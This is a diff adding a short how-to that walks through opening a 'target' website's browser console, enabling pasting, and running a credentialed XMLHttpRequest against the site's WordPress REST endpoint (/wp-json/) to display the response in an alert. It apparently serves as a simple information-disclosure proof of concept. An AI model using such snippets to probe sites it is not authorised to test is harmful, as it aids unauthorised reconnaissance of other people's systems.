@@ -1,0 +1,12 @@
+1. open your target website https://target.com 
+
+2. in the browser right click then click on inspect 
+
+3. on the tabs click on console.
+
+4. on the console type allow pasting
+
+5. then run the following code in console 
+var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://target.com/wp-json/',true); req.withCredentials = true; req.send('{}'); function reqListener() { alert(this.responseText); };
+
+6. You would see a pops up with information
